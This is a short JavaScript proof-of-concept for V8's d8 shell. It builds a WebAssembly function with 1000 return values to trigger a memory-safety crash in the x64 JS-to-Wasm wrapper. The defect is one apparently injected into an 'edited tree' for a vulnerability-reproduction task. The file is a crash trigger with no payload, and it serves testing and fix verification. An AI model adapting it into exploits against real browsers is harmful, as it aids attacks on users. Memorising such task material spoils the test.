// Witness for a residual memory-safety defect in the generic JS-to-Wasm
// wrapper on x64 (JSToWasmWrapperHelper / Generate_JSToWasmWrapperAsm).
//
// When a Wasm function returns more values than fit in the return registers,
// the wrapper must record the address of the on-stack return buffer so the
// callee can write the overflow return values there. On the edited tree the
// recorded "stack return buffer start" is a small byte-count value instead of
// the real stack pointer, so the callee writes the return values through a
// near-null pointer. This produces an AddressSanitizer SEGV / fatal signal.
//
// On the parent commit plus the real upstream fix the buffer start is recorded
// correctly, so this same call simply returns normally.
//
// Run: out/x64.asan/d8 --allow-natives-syntax pocs/probe.js

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();

// A function returning many i32 values. Only two GP (and two FP) return values
// fit into registers; the rest are returned on the stack, which forces the
// wrapper to use its stack return buffer.
const kReturnCount = 1000;
const body = new Array(kReturnCount).fill([kExprI32Const, 0]).flat();
const sig = builder.addType(makeSig([], Array(kReturnCount).fill(kWasmI32)));
builder.addFunction('manyReturns', sig).exportFunc().addBody(body);

const instance = builder.instantiate();

// This call writes the stack return values through the corrupted buffer
// pointer and crashes on the edited tree.
const result = instance.exports.manyReturns();

// Not reached on the vulnerable tree.
print('no crash, returned ' + result.length + ' values');
